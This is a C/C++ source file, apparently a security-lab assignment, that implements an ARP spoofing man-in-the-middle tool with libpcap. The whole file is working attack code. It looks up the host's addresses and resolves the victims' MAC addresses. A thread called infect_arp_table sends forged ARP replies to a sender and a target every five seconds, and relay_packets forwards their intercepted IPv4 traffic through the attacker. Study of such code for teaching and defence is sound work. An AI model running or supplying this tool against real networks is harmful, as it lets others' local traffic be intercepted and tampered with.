#include "function.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    ethernet_header eth_;
    arp_header      arp_;
};
#pragma pack(pop)

void print_err_command() {
    printf("syntax: sudo ./pcap <interface>\n");
    printf("sample: sudo ./pcap wlan0\n");
}

void get_network_info(const char *iface, char *my_ipv4, uint8_t my_mac[6]) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || !(ifa->ifa_flags & IFF_UP)) continue;

        if (strcmp(ifa->ifa_name, iface) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &addr->sin_addr, my_ipv4, INET_ADDRSTRLEN);
        }

        if (strcmp(ifa->ifa_name, iface) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
            memcpy(my_mac, s->sll_addr, 6);
        }
    }

    freeifaddrs(ifaddr);
}

void send_arp_packet(pcap_t* pcap, uint8_t eth_dmac[6], uint8_t eth_smac[6], uint16_t arp_op,
                     uint8_t arp_smac[6],    char* sip, uint8_t arp_tmac[6], char* tip)
{
    EthArpPacket packet;

    memcpy(packet.eth_.dst_mac, eth_dmac, 6);
    memcpy(packet.eth_.src_mac, eth_smac, 6);
    packet.eth_.ether_type = htons(ETHER_TYPE_ARP);

    packet.arp_.htype = htons(ARP_HTYPE_ETHER);
    packet.arp_.ptype = htons(ETHER_TYPE_IPV4);
    packet.arp_.hlen = MAC_ADDR_SIZE;
    packet.arp_.plen = IPV4_ADDR_SIZE;
    packet.arp_.oper = htons(arp_op);
    memcpy(packet.arp_.sha, arp_smac, 6);
    packet.arp_.spa = inet_addr(sip);
    memcpy(packet.arp_.tha, arp_tmac, 6);
    packet.arp_.tpa = inet_addr(tip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

void resolve_mac_addr(pcap_t* pcap, char* my_ipv4, char* sender_ip, uint8_t* resolved_mac)
{
    while (true) {
        struct pcap_pkthdr *header;
        const u_char *recv_packet;

        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        struct ethernet_header* eth = (struct ethernet_header*)recv_packet;
        if(ntohs(eth->ether_type) != ETHER_TYPE_ARP) continue;

        struct arp_header* arp = (struct arp_header*)(recv_packet + sizeof(struct ethernet_header));
        if(ntohs(arp->oper) != ARP_OPER_REPLY) continue;

        struct in_addr temp_ip;
        inet_aton(my_ipv4, &temp_ip);

        if (memcmp(&arp->tpa, &temp_ip, sizeof(struct in_addr)) == 0) {
            inet_aton(sender_ip, &temp_ip);
            if(memcmp(&arp->spa, &temp_ip, sizeof(struct in_addr)) == 0){
                memcpy(resolved_mac, arp->sha, MAC_ADDR_SIZE);
                break;
            }
        }
    }
}

void* infect_arp_table(void* arg) {
    ArpInfectArgs* args = (ArpInfectArgs*)arg;

    while (true) {
        send_arp_packet(args->pcap,
                        args->sender_mac,
                        args->attacker_mac,
                        ARP_OPER_REPLY,
                        args->attacker_mac,
                        args->target_ip,
                        args->sender_mac,
                        args->sender_ip);

        send_arp_packet(args->pcap,
                        args->target_mac,
                        args->attacker_mac,
                        ARP_OPER_REPLY,
                        args->attacker_mac,
                        args->sender_ip,
                        args->target_mac,
                        args->target_ip);
        sleep(5);
    }
    return nullptr;
}

void* relay_packets(void* arg) {
    ArpInfectArgs* args = (ArpInfectArgs*)arg;

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(args->pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(args->pcap));
            break;
        }

        struct ethernet_header* eth = (struct ethernet_header*)packet;

        // IPv4 패킷만 릴레이
        if (ntohs(eth->ether_type) != ETHER_TYPE_IPV4) continue;

        // 본인이 보낸 패킷은 무시 (루프 방지)
        if (memcmp(eth->src_mac, args->attacker_mac, 6) == 0) continue;

        // sender → target 방향
        if (memcmp(eth->src_mac, args->sender_mac, 6) == 0 &&
            memcmp(eth->dst_mac, args->attacker_mac, 6) == 0) {
            memcpy(eth->src_mac, args->attacker_mac, 6);
            memcpy(eth->dst_mac, args->target_mac, 6);
            pcap_sendpacket(args->pcap, packet, header->caplen);
        }
        // target → sender 방향
        else if (memcmp(eth->src_mac, args->target_mac, 6) == 0 &&
                 memcmp(eth->dst_mac, args->attacker_mac, 6) == 0) {
            memcpy(eth->src_mac, args->attacker_mac, 6);
            memcpy(eth->dst_mac, args->sender_mac, 6);
            pcap_sendpacket(args->pcap, packet, header->caplen);
        }
    }

    return nullptr;
}
